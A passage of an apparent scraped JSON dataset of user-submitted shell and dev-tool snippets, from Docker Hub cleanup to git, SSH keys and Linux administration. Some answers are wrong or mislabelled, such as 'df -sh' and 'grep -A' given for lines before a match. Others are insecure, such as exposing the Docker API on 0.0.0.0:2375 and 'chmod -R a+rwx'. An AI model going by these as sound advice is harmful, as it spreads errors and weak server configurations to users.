account\" sleep 10 for i in ${FULL_IMAGE_LIST} do   echo ${i} done  sleep 10 echo echo \"Identifying and deleting images which are older than 50 days in ${UNAME} docker hub account\" sleep 10 for i in ${REPO_LIST}  #NOTE!!! For deleting Specific repositories images please include only those repositories in for loop  like below for loop which has repos mygninx and mykibana  #for i in  mynginx mykibana   do   # get tags for repo   echo   echo \"Looping Through $i repository in ${UNAME} account\"   IMAGE_TAGS=$(curl -s -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/${i}/tags/?page_size=10000 | jq -r '.results|.[]|.name')    # build a list of images from tags   for j in ${IMAGE_TAGS}   do       echo       # add last_updated_time     updated_time=$(curl -s -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/${i}/tags/${j}/?page_size=10000 | jq -r '.last_updated')     echo $updated_time     datetime=$updated_time     timeago='50 days ago'      dtSec=$(date --date \"$datetime\" +'%s')     taSec=$(date --date \"$timeago\" +'%s')      echo \"INFO: dtSec=$dtSec, taSec=$taSec\"              if [ $dtSec -lt $taSec ]             then               echo \"This image ${UNAME}/${i}:${j} is older than 50 days, deleting this  image\"               ## Please uncomment below line to delete docker hub images of docker hub repositories               #curl -s  -X DELETE  -H \"Authorization: JWT ${TOKEN}\" https://hub.docker.com/v2/repositories/${UNAME}/${i}/tags/${j}/            else               echo \"This image ${UNAME}/${i}:${j} is within 50 days time range, keep this image\"            fi         done done  echo \"Script execution ends\"   \n",
    "reg_date": "2021-10-11T22:06:26.000Z"
  },
  {
    "id": 2255,
    "keyword": null,
    "link": null,
    "title": " how to delete images older than x days from docker hub",
    "description": "docker image prune -a --filter \"until=$(date +'%Y-%m-%dT%H:%M:%S' --date='-15 days')\"\n",
    "reg_date": "2021-10-11T22:06:26.000Z"
  },
  {
    "id": 2256,
    "keyword": null,
    "link": null,
    "title": " how to delete installed library from react native project",
    "description": "1. If it is a library based only on javascript, than you can just run    npm uninstall --save package_name or npm uninstall --save-dev package_name 2. If you have installed a library with native content that requires linking,    and you have linked it with npm then you can do:    npm unlink [package_name] then follow step 1 3. If you've installed a library with native content manually,    then just undo all the steps you took to add the library in the first place.    Then follow step 1.\nrun npm uninstall <package>\n",
    "reg_date": "2021-10-11T22:06:26.000Z"
  },
  {
    "id": 2257,
    "keyword": null,
    "link": null,
    "title": " how to delete large folders in windows super fast",
    "description": "The two commands that users require are Del, for deleting files, and Rmdir, for removing directories.  1. Tap on the Windows-key, type cmd.exe and select the result to load the command prompt.  2. Navigate to the folder that you want to delete (with all its files and subfolders). Use cd path, e.g. cd o:\\backups\\test\\ to do so.  3. The command del /f /q /s *.* > NUL deletes all files in that folder structure, and omits the output which improves the process further.  4. Use cd.. to navigate to the parent folder afterwards.  5. Run the command rmdir /q /s foldername to delete the folder and all of its subfolders.  The commands may require some explanation := =========================================  del /f /q /s *.* > NUL :- ---------------------- /f -- forces the deletion of read-only files. /q -- enables quiet mode. You are not ask if it is ok to delete files (if you don't use this, you are asked for any file in the folder).  /s -- runs the command on all files in any folder under the selected structure. *.* -- delete all files. > NUL -- disables console output. This improves the process further, shaving off about one quarter of the processing time off of the console command. ================================================================================  rmdir /q /s foldername :-  ------------------------ /q -- Quiet mode, won't prompt for confirmation to delete folders. /s -- Run the operation on all folders of the selected path. foldername -- The absolute path or relative folder name, e.g. o:/backup/test1 or test1 \n",
    "reg_date": "2021-10-11T22:06:26.000Z"
  },
  {
    "id": 2258,
    "keyword": null,
    "link": null,
    "title": " how to delete services in kubernetes",
    "description": "kubectl delete services yourServiceNameHere\n",
    "reg_date": "2021-10-11T22:06:26.000Z"
  },
  {
    "id": 2259,
    "keyword": null,
    "link": null,
    "title": " how to deploy to netlify from cli",
    "description": "npm i -g netlify-cli netlify init netlify deploy\nnetlify deploy --open \ngit clone https://github.com/netlify/create-react-app-lambda.git cd create-react-app-lambda npm install\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2260,
    "keyword": null,
    "link": null,
    "title": " how to determine the file type in ubuntu",
    "description": "find ~/ -type f -name \"postgis-2.0.0\"\n#run the following command file <file_name.type_of_file> #for example:-  file biggner.py #output biggner.py : ASCII text\n$ find /path/to/file/ -iname filename\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2261,
    "keyword": null,
    "link": null,
    "title": " how to do a network scan to see ip numbers in your network",
    "description": "arp -a\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2262,
    "keyword": null,
    "link": null,
    "title": " how to do a repeat until loop in bash",
    "description": "until [CONDITION] do   [COMMANDS] done\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2263,
    "keyword": null,
    "link": null,
    "title": " how to do sum with exper in linux",
    "description": "exper 60+80\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2264,
    "keyword": null,
    "link": null,
    "title": " how to downlaod and install chrome in kali linux",
    "description": "please subscribe my channel - https://bit.ly/2Me2CfB  apt update wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb apt install ./google-chrome-stable_current_amd64.deb\n wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb  apt install ./google-chrome-stable_current_amd64.deb google-chrome --no-sandbox\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2265,
    "keyword": null,
    "link": null,
    "title": " how to download from git branch",
    "description": "git clone <url> --branch <branch>  to clone/download only the contents of the branch.\n",
    "reg_date": "2021-10-11T22:06:27.000Z"
  },
  {
    "id": 2266,
    "keyword": null,
    "link": null,
    "title": " how to download steam on linux",
    "description": "$ sudo apt update $ sudo apt install steam $ steam\nGo to the steam store page, and find any game YOU want to play. I'd sugest a free game like War thunder (just incase it doesn't work) Make sure you're signed in and have an account Press 'download' (or add to my library, and make sure it has the steam logo above to the right) Press 'No, i need to download steam' once you've clicked it Download the .deb file and launch it login and download all the games you want HAVE FUN! ____________________ If that does work sudo apt-get install steam download steam and then find it. Have fun  You can play Windows games on steam. Even if you're on linux. Go to settings (top left) and find 'steam play' and use the latest version of Proton. Let porton download then restart steam find a windows game and download it press 'install'  then to save hassle, go to 'Manage Downloads' and then click 'Play' button on the game (make sure it's NOT downloaded, but its currently downloading) then it'll re-download using Proton\n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2267,
    "keyword": null,
    "link": null,
    "title": " how to download utorrent in kali linux",
    "description": "sk@server:~$ wget http://download.utorrent.com/linux/utorrent-server-3.0-25053.tar.gz\n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2268,
    "keyword": null,
    "link": null,
    "title": " how to download workbench for linux",
    "description": "sudo apt update sudo apt upgrade sudo apt install snap sudo snap install mysql-workbench-community sudo snap connect mysql-workbench-community:password-manager-service :password-manager-service\n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2269,
    "keyword": null,
    "link": null,
    "title": " how to download youtube video from command line",
    "description": "# This will get the latest version. Also, if you use a different # pip for a specific version of Python (such as pip3.9), be sure to  # use that one instead. pip install youtube-dl  # Basic Usage: youtube-dl <Video URL>\n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2270,
    "keyword": null,
    "link": null,
    "title": " how to edit the sudoers file the safe way",
    "description": "sudo visudo //NEVER edit the sudoers file with other text editors, becuase it is very dangerous\n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2271,
    "keyword": null,
    "link": null,
    "title": " how to enable autocomplete in jupyter notebook",
    "description": "1st command: pip install jupyter_contrib_nbextensions 2nd command: jupyter contrib nbextension install --user finally in the jupyter server enabable the \"Nbextensions -> hintland\"\nfrom jedi import settings settings.case_insensitive_completion = True \n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2272,
    "keyword": null,
    "link": null,
    "title": " how to enable ftp on centos 7",
    "description": "sudo yum update sudo yum install vsftpd  sudo systemctl start vsftpd  //to start the server on boot sudo systemctl enable vsftpd  //to allow trafic to port 21 sudo firewall-cmd --zone=public --permanent --add-port=21/tcp sudo firewall-cmd --zone=public --permanent --add-service=ftp sudo firewall-cmd &ndash;-reload  //Configuration  //to copy the config file sudo cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.default  //to exit the config file in nano editor you can use vi too sudo nano /etc/vsftpd/vsftpd.conf  //find the 2 entries and edit them to the given below anonymous_enable=NO local_enable=YES local_enable=YES chroot_local_user=YES   //Lmit FTP users to their own home directory. allow_writeable_chroot=YES  userlist_enable=YES userlist_file=/etc/vsftpd/user_list userlist_deny=NO  //after editing the file save it and restart the server sudo systemctl restart vsftpd  //create new ftp user sudo adduser testuser sudo passwd testuser  //add user to user list echo &ldquo;testuser&rdquo; | sudo tee &ndash;a /etc/vsftpd/user_list  //create directory for new user and adjust permissions sudo mkdir &ndash;p /home/testuser/ftp/upload sudo chmod 550 /home/testuser/ftp sudo chmod 750 /home/testuser/ftp/upload sudo chown &ndash;R testuser: /home/testuser/ftp  //now run tyour ftp ftp localhost\n",
    "reg_date": "2021-10-11T22:06:28.000Z"
  },
  {
    "id": 2273,
    "keyword": null,
    "link": null,
    "title": " how to enable gitlab runner to use local docker images",
    "description": "open the file config.toml in /etc/gitlab-runner using sudo and add the follwoing line to the docker runner pull_policy = \"if-not-present\"  Below is an example of config.toml I have on my machine  $ sudo vi /etc/gitlab-runner/config.toml  concurrent = 1 check_interval = 0  [session_server]   session_timeout = 1800  [[runners]]   name = \"docker_dd_online\"   url = \"https://gitlab.com/\"   token = \"**********\"   executor = \"docker\"   [runners.custom_build_dir]   [runners.cache]     [runners.cache.s3]     [runners.cache.gcs]     [runners.cache.azure]   [runners.docker]     tls_verify = false     image = \"local_docker_image:latest\"     privileged = false     disable_entrypoint_overwrite = false     oom_kill_disable = false     disable_cache = false     volumes = [\"/cache\"]     shm_size = 0     pull_policy = \"if-not-present\"\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2274,
    "keyword": null,
    "link": null,
    "title": " how to enable remote desktop with cmd",
    "description": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2275,
    "keyword": null,
    "link": null,
    "title": " how to enable scroll lock in ubuntu 20",
    "description": "xmodmap -e 'add mod3 = Scroll_Lock'\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2276,
    "keyword": null,
    "link": null,
    "title": " how to exit telnet linux",
    "description": "The trick here is you need to first type escape character e.g. '^]' which is 'Ctrl + ]' and then type quit to close the telnet terminal in Linux or any UNIX system.Jan 26, 2019 \n#Ctrl+C doesn't work, you should ctrl+] but the most easy way #is just type \"quit\" and enter quit\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2277,
    "keyword": null,
    "link": null,
    "title": " how to exit vim",
    "description": "#Press 'Esc' to change from Edit Mode to Command Mode #Exit :q #Force quit without saving :q! #Save file and quit :wq\nPress Esc key: This is very important, because you must exit the edit mode first before typing the exit command(s). Next, you can type one of the following commands: :q (yes, the colon is included in the command) &ndash; This will quit the editor :q! &ndash; Quit Vim without saving the data file :wq &ndash; Save the file and exit Vim And then press the Enter key\n#how to get out from vim Editor (linux)  #Press 'Esc' to change from Edit Mode to Command Mode #Exit :q #Force quit without saving :q! #Save file and quit :wq\n# ESC to start command prompt, then :q!\t\t# exit vi without saving :wq!\t# exit vi with saving (! means exiting even if file is read only)\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2278,
    "keyword": null,
    "link": null,
    "title": " how to expose docker api over tcp",
    "description": "## Use the command sudo systemctl edit docker.service ## to open an override file for docker.service in a text editor and ## add below  lines(this is for testing purpose only, ##while PROD access or expose Docker api through tls or a proxy) $ sudo systemctl edit docker.service [Service] ExecStart= #ExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375 ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375  #Reload the systemctl configuration.  $ sudo systemctl daemon-reload  #Restart Docker.  $ sudo systemctl restart docker.service  #Check to see whether the change was honored by reviewing the  #output of netstat to confirm dockerd is listening on the configured port.  $ sudo netstat -lntp | grep dockerd tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN      3758/dockerd  $ sudo docker -H tcp://<your IP>:2375 ps  \n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2279,
    "keyword": null,
    "link": null,
    "title": " how to extract key and cert from pfx",
    "description": "# enter password and pass phrase used to encrypt when prompted openssl pkcs12 -in [yourfile.pfx] -nocerts -out [cert_encr.key] openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [cert.crt] # decrypt the key file openssl rsa -in [cert_encr.key] -out [cert.key]\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2280,
    "keyword": null,
    "link": null,
    "title": " how to extract rar file in ubuntu",
    "description": "# install unrar sudo apt-get install unrar  # extract the file unrar e filename.rar\n sudo apt-get install unrar. Or. $ sudo apt install unrar. ... unrar e filename.rar\n// first download unrar sudo apt install unrar // after the unrar installed you can unrar your file with this command unrar e filename.rar // and the next command if you wont your file with the orginal directory unrar x filename.rar\n",
    "reg_date": "2021-10-11T22:06:29.000Z"
  },
  {
    "id": 2281,
    "keyword": null,
    "link": null,
    "title": " how to extract tar.gz file in colab",
    "description": "!tar -xvf /content/x.tar.gz\n!tar -xvf  'file.tar' -C 'destination'\n",
    "reg_date": "2021-10-11T22:06:30.000Z"
  },
  {
    "id": 2282,
    "keyword": null,
    "link": null,
    "title": " how to extract tgz file in linux",
    "description": "tar zxvf file_name.tgz  where, -z : Uncompress the resulting archive with gzip command -x : Extract to disk from the archive -v : Produce verbose output i.e. show progress and file names while extracting files -f backup.tgz : Read the archive from the specified file called backup.tgz\ntar zxvf file.tgz\n",
    "reg_date": "2021-10-11T22:06:30.000Z"
  },
  {
    "id": 2283,
    "keyword": null,
    "link": null,
    "title": " how to fetch upstream changes gitlab fork",
    "description": "# Git CLI  # Add a secondary remote called upstream.  git remote add upstream https://...  # Fetch the remote and then pull its changes into your local master branch.  git checkout master git fetch upstream git pull upstream master  # Last, push to your own remote origin to keep the forked repo in sync.  git push origin master\n",
    "reg_date": "2021-10-11T22:06:30.000Z"
  },
  {
    "id": 2284,
    "keyword": null,
    "link": null,
    "title": " how to find all the dir in current working directory in linux",
    "description": "dir \n",
    "reg_date": "2021-10-11T22:06:30.000Z"
  },
  {
    "id": 2285,
    "keyword": null,
    "link": null,
    "title": " how to find and replace a string in a file using shell script",
    "description": "# replaces ALL(g i.e. global) ouccurences of \"original_string\" with \"new_string\",  # in the file file_name.ext_name sed -i 's/original_string/new_string/g' file_name.ext_name\n",
    "reg_date": "2021-10-11T22:06:30.000Z"
  },
  {
    "id": 2286,
    "keyword": null,
    "link": null,
    "title": " how to find and replace a string in a file using shell script on mac",
    "description": "# replaces ALL(g i.e. global) ouccurences of \"original_string\" with \"new_string\",  # in the file file_name.ext_name sed -i '' \"s/original_string/new_string/g\" file_name.ext_name\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2287,
    "keyword": null,
    "link": null,
    "title": " how to find distro name",
    "description": "cat /etc/os-release lsb_release -a hostnamectl Type the following command to find Linux kernel version: uname -r\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2288,
    "keyword": null,
    "link": null,
    "title": " how to find factor in linux cmd",
    "description": "#run the folling command factor #it will run and then input any number to get its factor\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2289,
    "keyword": null,
    "link": null,
    "title": " how to find host name in linux",
    "description": "$ hostnamectl\n$ hostname\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2290,
    "keyword": null,
    "link": null,
    "title": " how to find installed packages in ubuntu",
    "description": "apt list --installed\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2291,
    "keyword": null,
    "link": null,
    "title": " how to find jvm path in linux",
    "description": "which java\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2292,
    "keyword": null,
    "link": null,
    "title": " how to find my ssh username",
    "description": "whoami\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2293,
    "keyword": null,
    "link": null,
    "title": " how to find process running on port in ubuntu",
    "description": "sudo lsof -i:8080\nlsof -i -P -n\n",
    "reg_date": "2021-10-11T22:06:31.000Z"
  },
  {
    "id": 2294,
    "keyword": null,
    "link": null,
    "title": " how to find public ip address in linux",
    "description": "$ wget -qO- http://ipecho.net/plain | xargs echo $ wget -qO - icanhazip.com  120.88.41.175 \nwget -qO- http://ipecho.net/plain | xargs echo\n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2295,
    "keyword": null,
    "link": null,
    "title": " how to find where python modules are installed",
    "description": "# this will show where numpy is installed pip show numpy\n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2296,
    "keyword": null,
    "link": null,
    "title": " how to fix /opt/lampp/bin/mysql.server: 264: kill: no such process",
    "description": "service mysql stop sudo opt/lampp/lampp restart\n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2297,
    "keyword": null,
    "link": null,
    "title": " how to fix could not fix var lock /var/lib/dpkg/lock ubuntu",
    "description": "sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock\nsudo rm /var/lib/apt/lists/lock\n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2298,
    "keyword": null,
    "link": null,
    "title": " how to fix the last commit message",
    "description": "git commit --amend -m \"New commit message.\"\n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2299,
    "keyword": null,
    "link": null,
    "title": " how to flush dns on mac",
    "description": "dscacheutil -flushcache; sudo killall -HUP mDNSResponder\n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2300,
    "keyword": null,
    "link": null,
    "title": " how to force quit application in ubuntu",
    "description": "One way is to hit alt+f2, then type xkill and hit enter.  Now click on the program you would like to force quit. \n",
    "reg_date": "2021-10-11T22:06:32.000Z"
  },
  {
    "id": 2301,
    "keyword": null,
    "link": null,
    "title": " how to full update kali linux",
    "description": "sudo apt full-upgrade -y\n",
    "reg_date": "2021-10-11T22:06:33.000Z"
  },
  {
    "id": 2302,
    "keyword": null,
    "link": null,
    "title": " how to generate rsa key in linux",
    "description": "ssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\nssh-keygen\n",
    "reg_date": "2021-10-11T22:06:33.000Z"
  },
  {
    "id": 2303,
    "keyword": null,
    "link": null,
    "title": " how to generate ssh key",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen -t rsa -C \"your_email@example.com\"\nssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\n ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n$ ssh-keygen -t ed25519 -C \"your_email@example.com\"\nssh-keygen ssh-copy-id your_email@example.com\n",
    "reg_date": "2021-10-11T22:06:33.000Z"
  },
  {
    "id": 2304,
    "keyword": null,
    "link": null,
    "title": " how to generate ssh key for git",
    "description": "Generate SSH Key: $ ssh-keygen -t rsa -C \"email@example.com\"  Add public key to git: $ cat ~/.ssh/id_rsa.pub (copy all) - Open web browser and paste the output on the client settings you use.  Start SSH agent: $ eval \"$(ssh-agent -s)\"  Add private key to SSH agent: $ ssh-add ~/.ssh/id_rsa\n$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n### ADD SSH key to Github  ###  # Check if you have a key? ssh-add -l  # If not? then follow steps to generate key ssh-keygen -t rsa -b 4096 -C your__gmail  # Now for copy the key use xclip tool or just goto file and copy sudo apt install xclip xclip -sel clip < ~/.ssh/id_rsa.pub  # Now goto github.com and goto settings  # select  SSH and GPG keys # New SSH key # Enter \"your__choice__name\" in title field... # Paste your public key into the Key field # Click Add SSH key  DONE!!!     \nStep1: in git bash type this $ ssh-keygen -t ed25519 -C \"your_email@example.com\"  Step2: start the ssh-agent in the background $ eval \"$(ssh-agent -s)\"  Step3: Add your SSH private key to the ssh-agent. $ ssh-add ~/.ssh/id_ed25519  Step4: Generate public key  $ cat ~/.ssh/id_ed25519.pub  Step5: Copy and Paste the generate key to your github SSH key Done!\n$ ssh-add ~/.ssh/id_rsa\n$ ssh-keygen -t ed25519 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:06:33.000Z"
  },
  {
    "id": 2305,
    "keyword": null,
    "link": null,
    "title": " how to generate ssh key in linux",
    "description": "ssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\nssh-keygen -t rsa -C \"your_email@example.com\"\nssh-keygen\n",
    "reg_date": "2021-10-11T22:06:33.000Z"
  },
  {
    "id": 2306,
    "keyword": null,
    "link": null,
    "title": " how to get a script's directory in bash",
    "description": "#!/bin/bash  DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" >/dev/null 2>&1 && pwd )\"\n",
    "reg_date": "2021-10-11T22:06:33.000Z"
  },
  {
    "id": 2307,
    "keyword": null,
    "link": null,
    "title": " how to get current git branch",
    "description": "git branch --show-current \ngit rev-parse --abbrev-ref HEAD \n",
    "reg_date": "2021-10-11T22:06:34.000Z"
  },
  {
    "id": 2308,
    "keyword": null,
    "link": null,
    "title": " how to get divided number in mac terminal",
    "description": "echo $((10/2))\n",
    "reg_date": "2021-10-11T22:06:34.000Z"
  },
  {
    "id": 2309,
    "keyword": null,
    "link": null,
    "title": " how to get git username and password",
    "description": "$ git config --global user.name \"Mona Lisa\" $ git config --global user.name $ mona\n",
    "reg_date": "2021-10-11T22:06:34.000Z"
  },
  {
    "id": 2310,
    "keyword": null,
    "link": null,
    "title": " how to get hostname on linux",
    "description": "$ hostnamectl\n",
    "reg_date": "2021-10-11T22:06:34.000Z"
  },
  {
    "id": 2311,
    "keyword": null,
    "link": null,
    "title": " how to get ip address in ubuntu",
    "description": "ip address show\nhostname -I | cut -d' ' -f1\nOpen your command prompt and type following command shown below and press enter  ifconfig -a\n",
    "reg_date": "2021-10-11T22:06:34.000Z"
  },
  {
    "id": 2312,
    "keyword": null,
    "link": null,
    "title": " how to get list of users in ubuntu",
    "description": "cat /etc/passwd\ncat /etc/passwd #check list of users in linux ubuntu\n",
    "reg_date": "2021-10-11T22:06:35.000Z"
  },
  {
    "id": 2313,
    "keyword": null,
    "link": null,
    "title": " how to get list port linux cmd",
    "description": "lsof -i -P -n | grep LISTEN\n",
    "reg_date": "2021-10-11T22:06:35.000Z"
  },
  {
    "id": 2314,
    "keyword": null,
    "link": null,
    "title": " how to get mac cpu temp",
    "description": "To get CPU temperature: sudo powermetrics|grep -i \"CPU die temperature\" To get GPU temperature: sudo powermetrics|grep -i \"GPU die temperature\"\n",
    "reg_date": "2021-10-11T22:06:35.000Z"
  },
  {
    "id": 2315,
    "keyword": null,
    "link": null,
    "title": " how to get my ip address mac terminal",
    "description": "# First launch Terminal in Mac #Then past code below:  ipconfig getifaddr en0\n",
    "reg_date": "2021-10-11T22:06:35.000Z"
  },
  {
    "id": 2316,
    "keyword": null,
    "link": null,
    "title": " how to get name of pc bash script",
    "description": "computer_name=$(whoami)  if [ $computer_name == \"NAME\" ] then     echo \"a is equal to b in NAME pc\"     echo $computer_name else     echo \"a is not equal to b another pc\"     echo $computer_name fi\n",
    "reg_date": "2021-10-11T22:06:35.000Z"
  },
  {
    "id": 2317,
    "keyword": null,
    "link": null,
    "title": " how to get out of git bash editor",
    "description": "On Windows GIT Bash Ctrl + X would do nothing and found out it works quite like  vi/vim. Press i to enter inline insert mode. Type the description at the very  top, press esc to exit insert mode, then type :x! (now the cursor is at the  bottom) and hit enter to save and exit.\n",
    "reg_date": "2021-10-11T22:06:35.000Z"
  },
  {
    "id": 2318,
    "keyword": null,
    "link": null,
    "title": " how to get out of git og",
    "description": "Type q to exit git log\n",
    "reg_date": "2021-10-11T22:06:36.000Z"
  },
  {
    "id": 2319,
    "keyword": null,
    "link": null,
    "title": " how to get permission in create folder and file on hard drive in ubuntu",
    "description": "sudo chmod -R a+rwx /path/to/folder\nchmod ugoa+rwx fichier3\n",
    "reg_date": "2021-10-11T22:06:36.000Z"
  },
  {
    "id": 2320,
    "keyword": null,
    "link": null,
    "title": " how to get powers",
    "description": "how to get powers \n",
    "reg_date": "2021-10-11T22:06:36.000Z"
  },
  {
    "id": 2321,
    "keyword": null,
    "link": null,
    "title": " how to get ram detail in linux",
    "description": "sudo lshw -short -C memory\nsudo dmidecode --type 17\ncat /proc/meminfo | grep Mem\n",
    "reg_date": "2021-10-11T22:06:36.000Z"
  },
  {
    "id": 2322,
    "keyword": null,
    "link": null,
    "title": " how to get server ip address centos",
    "description": "$ ip addr show \n",
    "reg_date": "2021-10-11T22:06:36.000Z"
  },
  {
    "id": 2323,
    "keyword": null,
    "link": null,
    "title": " how to get the folder size in linux",
    "description": "df -sh .\ndu -lh --max-depth=1 --block-size=M | sort -nr\ndu -sh folder/ \n",
    "reg_date": "2021-10-11T22:06:36.000Z"
  },
  {
    "id": 2324,
    "keyword": null,
    "link": null,
    "title": " how to get the size of directory in linux",
    "description": "du -sh /var\ndu -sh /home/george 2.1G    /home/george \n",
    "reg_date": "2021-10-11T22:06:37.000Z"
  },
  {
    "id": 2325,
    "keyword": null,
    "link": null,
    "title": " how to get the temp of cpu in linux terminal raspberry pi",
    "description": "cpu=$(</sys/class/thermal/thermal_zone0/temp) echo \"$((cpu/1000)) c\"\n",
    "reg_date": "2021-10-11T22:06:37.000Z"
  },
  {
    "id": 2326,
    "keyword": null,
    "link": null,
    "title": " how to git clone from a specific branch git",
    "description": "git clone -b <branchName> <remote_repo_url>\ngit clone --single-branch --branch master https://github.com/career-karma-tutorials/ck-git\n",
    "reg_date": "2021-10-11T22:06:37.000Z"
  },
  {
    "id": 2327,
    "keyword": null,
    "link": null,
    "title": " how to git commit without message",
    "description": "#newer versions of git allow for this git commit -a --allow-empty-message -m ''\n",
    "reg_date": "2021-10-11T22:06:37.000Z"
  },
  {
    "id": 2328,
    "keyword": null,
    "link": null,
    "title": " how to gitignore node modules",
    "description": "node_modules/ \ntouch .gitignore  //to create a .gitignore if you dont have one echo \"node_modules/\" >> .gitignore //this adds node_modules to gitignore cat .gitignore //checks what files you have in your gitignore \nIf you add the below text into your .gitignore file, then it will look for the node_modules directory. Then the node_modules directory will be ignored.    node_modules/\n//create a .gitignore file and add the following in it # dependencies node_modules\n",
    "reg_date": "2021-10-11T22:06:37.000Z"
  },
  {
    "id": 2329,
    "keyword": null,
    "link": null,
    "title": " how to grep if the first letter is a character not a number",
    "description": "grep -i \"^[a-z]\"\n",
    "reg_date": "2021-10-11T22:06:37.000Z"
  },
  {
    "id": 2330,
    "keyword": null,
    "link": null,
    "title": " how to grep lines before a pattern",
    "description": "cat abc.txt | grep -A 3 \"your_pattern\"  # will grep 3 lines after your pattern..\n",
    "reg_date": "2021-10-11T22:06:38.000Z"
  },
  {
    "id": 2331,
    "keyword": null,
    "link": null,
    "title": " how to halt batch script execution for 5 seconds",
    "description": "@echo off echo %time% timeout 5 > NUL echo %time% \n",
    "reg_date": "2021-10-11T22:06:38.000Z"
  },
  {
    "id": 2332,
    "keyword": null,
    "link": null,
    "title": " how to hide the long path in kali linux",
    "description": "To change it for the current terminal instance only Just enter PS1='\\u:\\W\\$ ' and press enter.  To change it \"permanently\" In your ~/.bashrc, find the following section:  if [ \"$color_prompt\" = yes ]; then     PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' else     PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ ' fi Remove the @\\h, and replace the \\w with an uppercase \\W, so that it becomes:  if [ \"$color_prompt\" = yes ]; then     PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\W\\[\\033[00m\\]\\$ ' else     PS1='${debian_chroot:+($debian_chroot)}\\u:\\W\\$ ' fi Save, exit, close terminal and start another to see the result.\n",
    "reg_date": "2021-10-11T22:06:38.000Z"
  },
  {
    "id": 2333,
    "keyword": null,
    "link": null,
    "title": " how to increase nginx maximum file upload size",
    "description": "sudo nano /etc/nginx/nginx.conf # edit/add the following line  client_max_body_size 8M; # put the size that is enough sudo nano /etc/php/php.ini # edit the following upload_max_filesize=8M # also put what is enough\n",
    "reg_date": "2021-10-11T22:06:38.000Z"
  },
  {
    "id": 2334,
    "keyword": null,
    "link": null,
    "title": " how to initialize a git repository command line",
